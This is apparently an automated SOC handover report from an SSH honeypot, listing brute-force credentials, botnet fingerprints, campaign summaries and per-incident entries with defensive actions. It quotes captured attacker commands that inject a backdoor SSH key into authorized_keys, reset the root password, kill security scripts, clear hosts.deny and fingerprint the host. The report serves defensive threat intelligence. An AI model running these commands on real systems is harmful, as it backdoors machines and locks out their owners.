# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-04 |
| **Generated At** | 2026-07-04T06:50:56Z |
| **Shift Time** | 06:50 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **237** |
| Confirmed Threats | **154** |
| False Positives Filtered | **83** (35.0%) |
| Unique Attacker IPs | **38** |
| Countries of Origin | **15** |
| High Severity Cases | **115** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **122** |
| Malware Samples Analyzed | **3** HIGH · **37** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **119** |
| Unique Credential Pairs | **81** |
| Unique Usernames | **14** |
| Unique Passwords | **66** |
| Successful Auth Pairs | **111** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 82 |
| `admin` | 10 |
| `345gs5662d34` | 9 |
| `pi` | 4 |
| `lighthouse` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 10 |
| `345gs5662d34` | 9 |
| `123456789` | 4 |
| `1234` | 4 |
| `123` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 9 |
| `root` | `3245gs5662d34` | 7 |
| `root` | `party` | 3 |
| `root` | `123` | 2 |
| `root` | `1234` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `qq5201314` | `45.198.224.120` | 2026-07-04T02:55:05 |
| `root` | `Password3` | `118.145.111.33` | 2026-07-04T02:55:33 |
| `lighthouse` | `123456789` | `45.162.8.14` | 2026-07-04T02:55:40 |
| `345gs5662d34` | `345gs5662d34` | `45.162.8.14` | 2026-07-04T02:55:43 |
| `lighthouse` | `3245gs5662d34` | `45.162.8.14` | 2026-07-04T02:55:44 |
| `root` | `123qweqwe` | `171.25.158.24` | 2026-07-04T02:55:47 |
| `345gs5662d34` | `345gs5662d34` | `171.25.158.24` | 2026-07-04T02:55:49 |
| `root` | `3245gs5662d34` | `171.25.158.24` | 2026-07-04T02:55:50 |
| `root` | `3245gs5662d34` | `118.145.111.33` | 2026-07-04T02:56:01 |
| `root` | `20120101` | `103.63.108.25` | 2026-07-04T02:56:05 |
| `345gs5662d34` | `345gs5662d34` | `103.63.108.25` | 2026-07-04T02:56:09 |
| `root` | `3245gs5662d34` | `103.63.108.25` | 2026-07-04T02:56:11 |
| `root` | `123` | `91.92.40.7` | 2026-07-04T02:56:46 |
| `root` | `1234` | `91.92.40.7` | 2026-07-04T02:58:23 |
| `root` | `12345` | `91.92.40.7` | 2026-07-04T02:59:44 |
| `test` | `pass1234` | `20.96.179.87` | 2026-07-04T03:02:19 |
| `345gs5662d34` | `345gs5662d34` | `20.96.179.87` | 2026-07-04T03:02:20 |
| `test` | `3245gs5662d34` | `20.96.179.87` | 2026-07-04T03:02:21 |
| `root` | `1234567` | `91.92.40.7` | 2026-07-04T03:02:30 |
| `root` | `12345678` | `91.92.40.7` | 2026-07-04T03:03:52 |
| `root` | `asdf2025` | `189.240.44.9` | 2026-07-04T03:04:57 |
| `345gs5662d34` | `345gs5662d34` | `189.240.44.9` | 2026-07-04T03:05:00 |
| `root` | `3245gs5662d34` | `189.240.44.9` | 2026-07-04T03:05:00 |
| `root` | `123456789` | `91.92.40.7` | 2026-07-04T03:05:16 |
| `root` | `asdf123!@#` | `121.229.25.10` | 2026-07-04T03:06:31 |
| `root` | `1234567890` | `91.92.40.7` | 2026-07-04T03:06:44 |
| `ubuntu` | `debian1234` | `45.198.224.120` | 2026-07-04T03:07:26 |
| `root` | `asdf2025` | `118.145.102.69` | 2026-07-04T03:08:07 |
| `root` | `123abc` | `91.92.40.7` | 2026-07-04T03:08:14 |
| `root` | `1q2w3e4r` | `91.92.40.7` | 2026-07-04T03:09:51 |
| `root` | `P@ssw0rd123` | `91.92.40.7` | 2026-07-04T03:11:37 |
| `root` | `abc123` | `91.92.40.7` | 2026-07-04T03:13:39 |
| `root` | `Test123*` | `118.145.102.69` | 2026-07-04T03:15:25 |
| `345gs5662d34` | `345gs5662d34` | `118.145.102.69` | 2026-07-04T03:15:30 |
| `root` | `3245gs5662d34` | `118.145.102.69` | 2026-07-04T03:15:33 |
| `root` | `admin123` | `91.92.40.7` | 2026-07-04T03:16:08 |
| `root` | `letmein` | `91.92.40.7` | 2026-07-04T03:18:56 |
| `john` | `john` | `45.198.224.120` | 2026-07-04T03:19:48 |
| `root` | `pass123` | `91.92.40.7` | 2026-07-04T03:22:45 |
| `root` | `password` | `91.92.40.7` | 2026-07-04T03:27:49 |
| `root` | `000000` | `92.118.39.50` | 2026-07-04T03:28:15 |
| `root` | `Paris2024` | `118.145.102.69` | 2026-07-04T03:30:01 |
| `root` | `111111` | `92.118.39.50` | 2026-07-04T03:30:02 |
| `root` | `123` | `92.118.39.50` | 2026-07-04T03:31:45 |
| `deploy` | `deploy123` | `45.198.224.120` | 2026-07-04T03:31:59 |
| `root` | `123123` | `92.118.39.50` | 2026-07-04T03:33:27 |
| `root` | `password1` | `91.92.40.7` | 2026-07-04T03:34:32 |
| `root` | `party` | `185.242.3.195` | 2026-07-04T03:34:52 |
| `root` | `123321` | `92.118.39.50` | 2026-07-04T03:35:12 |
| `root` | `1234` | `92.118.39.50` | 2026-07-04T03:36:50 |
| `root` | `12345` | `92.118.39.50` | 2026-07-04T03:38:28 |
| `root` | `qwerty123` | `91.92.40.7` | 2026-07-04T03:41:42 |
| `root` | `1234567` | `92.118.39.50` | 2026-07-04T03:42:05 |
| `tom` | `tom123` | `122.168.123.73` | 2026-07-04T03:43:00 |
| `345gs5662d34` | `345gs5662d34` | `122.168.123.73` | 2026-07-04T03:43:05 |
| `tom` | `3245gs5662d34` | `122.168.123.73` | 2026-07-04T03:43:08 |
| `root` | `12345678` | `92.118.39.50` | 2026-07-04T03:44:01 |
| `root` | `qwe321` | `45.198.224.120` | 2026-07-04T03:44:12 |
| `root` | `123456789` | `92.118.39.50` | 2026-07-04T03:46:09 |
| `hairy` | `hairy123` | `185.242.3.121` | 2026-07-04T03:46:55 |
| `root` | `1234567890` | `92.118.39.50` | 2026-07-04T03:48:14 |
| `root` | `root123` | `91.92.40.7` | 2026-07-04T03:48:48 |
| `labuser` | `labuser` | `185.242.3.121` | 2026-07-04T03:49:48 |
| `root` | `123456a` | `92.118.39.50` | 2026-07-04T03:50:20 |
| `root` | `123456b` | `92.118.39.50` | 2026-07-04T03:52:33 |
| `root` | `123abc` | `92.118.39.50` | 2026-07-04T03:54:55 |
| `root` | `welcome` | `91.92.40.7` | 2026-07-04T03:56:14 |
| `root` | `q1w2e3r4t5` | `45.198.224.120` | 2026-07-04T03:56:28 |
| `root` | `123qwe` | `92.118.39.50` | 2026-07-04T03:57:19 |
| `root` | `adminpass` | `185.242.3.121` | 2026-07-04T03:58:38 |
| `user3` | `1234` | `185.242.3.121` | 2026-07-04T03:59:27 |
| `root` | `1q2w3e4r` | `92.118.39.50` | 2026-07-04T04:00:11 |
| `root` | `---fuck_you----` | `120.27.128.176` | 2026-07-04T04:00:23 |
| `root` | `555555` | `92.118.39.50` | 2026-07-04T04:03:08 |
| `admin` | `123` | `91.92.40.7` | 2026-07-04T04:03:53 |
| `root` | `654321` | `92.118.39.50` | 2026-07-04T04:06:30 |
| `support` | `support` | `176.53.159.196` | 2026-07-04T04:06:38 |
| `support` | `support` | `10.0.0.73` | 2026-07-04T04:08:00 |
| `pi` | `raspberryraspberry993311` | `138.59.233.5` | 2026-07-04T04:08:24 |
| `pi` | `raspberry` | `138.59.233.5` | 2026-07-04T04:08:24 |
| `root` | `Qwer234` | `45.198.224.120` | 2026-07-04T04:08:38 |
| `root` | `7777777` | `92.118.39.50` | 2026-07-04T04:10:00 |
| `admin` | `1234` | `91.92.40.7` | 2026-07-04T04:11:19 |
| `root` | `aa123456!!` | `103.143.231.24` | 2026-07-04T04:12:29 |
| `345gs5662d34` | `345gs5662d34` | `103.143.231.24` | 2026-07-04T04:12:31 |
| `root` | `3245gs5662d34` | `103.143.231.24` | 2026-07-04T04:12:32 |
| `root` | `abc123` | `92.118.39.50` | 2026-07-04T04:13:50 |
| `root` | `party` | `10.0.0.73` | 2026-07-04T04:15:10 |
| `root` | `admin` | `92.118.39.50` | 2026-07-04T04:17:46 |
| `admin` | `12345` | `91.92.40.7` | 2026-07-04T04:19:17 |
| `root` | `william` | `45.198.224.120` | 2026-07-04T04:20:56 |
| `root` | `admin123` | `92.118.39.50` | 2026-07-04T04:22:00 |
| `root` | `passw0rd` | `92.118.39.50` | 2026-07-04T04:26:28 |
| `admin` | `123456` | `91.92.40.7` | 2026-07-04T04:26:37 |
| `root` | `password` | `92.118.39.50` | 2026-07-04T04:30:56 |
| `root` | `Root.2021` | `45.198.224.120` | 2026-07-04T04:33:10 |
| `root` | `123@@@` | `140.245.50.204` | 2026-07-04T04:33:33 |
| `root` | `LeitboGi0ro` | `140.245.50.204` | 2026-07-04T04:33:34 |
| `root` | `smo@@kkklss` | `140.245.50.204` | 2026-07-04T04:33:38 |
| `admin` | `1234567` | `91.92.40.7` | 2026-07-04T04:33:43 |
| `root` | `password1` | `92.118.39.50` | 2026-07-04T04:35:32 |
| `root` | `123@@@` | `64.110.90.250` | 2026-07-04T04:36:10 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-07-04T04:36:13 |
| `admin` | `12345678` | `91.92.40.7` | 2026-07-04T04:40:02 |
| `root` | `qwerty` | `92.118.39.50` | 2026-07-04T04:40:15 |
| `root` | `welcome` | `92.118.39.50` | 2026-07-04T04:44:55 |
| `root` | `qaz1wsx2` | `45.198.224.120` | 2026-07-04T04:45:26 |
| `admin` | `123456789` | `91.92.40.7` | 2026-07-04T04:46:36 |
| `admin` | `000000` | `92.118.39.50` | 2026-07-04T04:49:37 |
| `admin` | `1234567890` | `91.92.40.7` | 2026-07-04T04:53:03 |
| `admin` | `111111` | `92.118.39.50` | 2026-07-04T04:54:18 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **237** |
| Sessions with Fingerprint | **12** |
| Unique HASSH Fingerprints | **12** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 71 |
| libssh | 50 |
| Paramiko (Python) | 6 |
| OpenSSH | 4 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 58 | 2 |
| `f555226df196...` | Mirai/variant | 22 | 8 |
| `af8223ac9914...` | libssh-based | 13 | 2 |
| `16443846184e...` | Generic scanner | 11 | 2 |
| `a2de0f306611...` | Mirai/variant | 6 | 2 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 58 | 2 | Mirai/variant |
| `f555226df196...` | libssh | 22 | 8 | Mirai/variant |
| `af8223ac9914...` | libssh | 13 | 2 | libssh-based |
| `16443846184e...` | Go SSH scanner | 11 | 2 | Generic scanner |
| `95420f9d932d...` | libssh | 8 | 4 | — |
| `a2de0f306611...` | Paramiko (Python) | 6 | 2 | Mirai/variant |
| `4ed0d5b0dc3b...` | libssh | 4 | 1 | Mirai/variant |
| `ae8bd7dd0997...` | OpenSSH | 4 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **8** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **Recon Loader Script** | 🟡 MEDIUM | 56 | 2 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 9 | 8 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:tYfcq8ECAKyk"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `121.229.25.10`

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `91.92.40.7`, `92.118.39.50`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `20.96.179.87`, `45.162.8.14`, `103.63.108.25`, `118.145.102.69`, `189.240.44.9`, `122.168.123.73`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **38** |
| Unique ASNs | **30** |
| High-Risk ASNs | **27** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS396982` | Google LLC | 2 | LOW |
| `AS4134` | CHINANET BACKBONE | 2 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 2 | HIGH |
| `AS398324` | Censys, Inc. | 2 | HIGH |
| `AS401626` | Netiface America, Inc. | 2 | HIGH |
| `AS31898` | Oracle Corporation | 2 | HIGH |
| `AS23724` | IDC, China Telecommunications Corporation | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (115)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-f607f11336e0

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-04 02:55 |
| **Last Seen** | 2026-07-04 02:55 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 02:55:05` | `cowrie.login.success` |
| `2026-07-04 02:55:09` | `cowrie.session.params` |
| `2026-07-04 02:55:09` | `cowrie.command.input` |
| `2026-07-04 02:55:12` | `cowrie.log.closed` |
| `2026-07-04 02:55:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f30095e6eb1

| Field | Detail |
|---|---|
| **Source IP** | `118.145.111[.]33` |
| **First Seen** | 2026-07-04 02:55 |
| **Last Seen** | 2026-07-04 03:00 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 02:55:31` | `cowrie.session.connect` |
| `2026-07-04 02:55:32` | `cowrie.client.version` |
| `2026-07-04 02:55:32` | `cowrie.client.kex` |
| `2026-07-04 02:55:33` | `cowrie.login.success` |
| `2026-07-04 02:55:34` | `cowrie.session.params` |
| `2026-07-04 02:55:34` | `cowrie.command.input` |
| `2026-07-04 02:55:34` | `cowrie.command.failed` |
| `2026-07-04 03:00:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.145.111[.]33` to AbuseIPDB if not already reported
- [ ] Block `118.145.111[.]33` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1c8d09a5a94

| Field | Detail |
|---|---|
| **Source IP** | `45.162.8[.]14` |
| **First Seen** | 2026-07-04 02:55 |
| **Last Seen** | 2026-07-04 02:55 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 02:55:40` | `cowrie.session.connect` |
| `2026-07-04 02:55:40` | `cowrie.client.version` |
| `2026-07-04 02:55:40` | `cowrie.client.kex` |
| `2026-07-04 02:55:40` | `cowrie.login.success` |
| `2026-07-04 02:55:41` | `cowrie.session.params` |
| `2026-07-04 02:55:41` | `cowrie.command.input` |
| `2026-07-04 02:55:41` | `cowrie.command.failed` |
| `2026-07-04 02:55:42` | `cowrie.log.closed` |
| `2026-07-04 02:55:42` | `cowrie.session.params` |
| `2026-07-04 02:55:42` | `cowrie.command.input` |
| `2026-07-04 02:55:43` | `cowrie.session.file_download` |
| `2026-07-04 02:55:43` | `cowrie.log.closed` |
| `2026-07-04 02:55:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.162.8[.]14` to AbuseIPDB if not already reported
- [ ] Block `45.162.8[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3fab4c9f303

| Field | Detail |
|---|---|
| **Source IP** | `45.162.8[.]14` |
| **First Seen** | 2026-07-04 02:55 |
| **Last Seen** | 2026-07-04 02:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 02:55:43` | `cowrie.session.connect` |
| `2026-07-04 02:55:43` | `cowrie.client.version` |
| `2026-07-04 02:55:43` | `cowrie.client.kex` |
| `2026-07-04 02:55:43` | `cowrie.login.success` |
| `2026-07-04 02:55:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.162.8[.]14` to AbuseIPDB if not already reported
- [ ] Block `45.162.8[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4846257196d

| Field | Detail |
|---|---|
| **Source IP** | `45.162.8[.]14` |
| **First Seen** | 2026-07-04 02:55 |
| **Last Seen** | 2026-07-04 02:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 02:55:43` | `cowrie.session.connect` |
| `2026-07-04 02:55:43` | `cowrie.client.version` |
| `2026-07-04 02:55:44` | `cowrie.client.kex` |
| `2026-07-04 02:55:44` | `cowrie.login.success` |
| `2026-07-04 02:55:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.162.8[.]14` to AbuseIPDB if not already reported
- [ ] Block `45.162.8[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f7f7cc8fb25

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]24` |
| **First Seen** | 2026-07-04 02:55 |
| **Last Seen** | 2026-07-04 02:55 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 02:55:46` | `cowrie.session.connect` |
| `2026-07-04 02:55:46` | `cowrie.client.version` |
| `2026-07-04 02:55:46` | `cowrie.client.kex` |
| `2026-07-04 02:55:47` | `cowrie.login.success` |
| `2026-07-04 02:55:47` | `cowrie.session.params` |
| `2026-07-04 02:55:47` | `cowrie.command.input` |
| `2026-07-04 02:55:47` | `cowrie.command.failed` |
| `2026-07-04 02:55:47` | `cowrie.log.closed` |
| `2026-07-04 02:55:48` | `cowrie.session.params` |
| `2026-07-04 02:55:48` | `cowrie.command.input` |
| `2026-07-04 02:55:48` | `cowrie.session.file_download` |
| `2026-07-04 02:55:48` | `cowrie.log.closed` |
| `2026-07-04 02:55:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]24` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]24` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1dccd95a60f

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]24` |
| **First Seen** | 2026-07-04 02:55 |
| **Last Seen** | 2026-07-04 02:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 02:55:49` | `cowrie.session.connect` |
| `2026-07-04 02:55:49` | `cowrie.client.version` |
| `2026-07-04 02:55:49` | `cowrie.client.kex` |
| `2026-07-04 02:55:49` | `cowrie.login.success` |
| `2026-07-04 02:55:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]24` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]24` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9271d70f17d

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]24` |
| **First Seen** | 2026-07-04 02:55 |
| **Last Seen** | 2026-07-04 02:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 02:55:49` | `cowrie.session.connect` |
| `2026-07-04 02:55:49` | `cowrie.client.version` |
| `2026-07-04 02:55:49` | `cowrie.client.kex` |
| `2026-07-04 02:55:50` | `cowrie.login.success` |
| `2026-07-04 02:55:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]24` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]24` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7314b6b0d9f

| Field | Detail |
|---|---|
| **Source IP** | `118.145.111[.]33` |
| **First Seen** | 2026-07-04 02:55 |
| **Last Seen** | 2026-07-04 03:01 |
| **Session Duration** | 303s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 02:55:58` | `cowrie.session.connect` |
| `2026-07-04 02:56:00` | `cowrie.client.version` |
| `2026-07-04 02:56:00` | `cowrie.client.kex` |
| `2026-07-04 02:56:01` | `cowrie.login.success` |
| `2026-07-04 03:01:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.145.111[.]33` to AbuseIPDB if not already reported
- [ ] Block `118.145.111[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8bf10902b862

| Field | Detail |
|---|---|
| **Source IP** | `103.63.108[.]25` |
| **First Seen** | 2026-07-04 02:56 |
| **Last Seen** | 2026-07-04 02:56 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
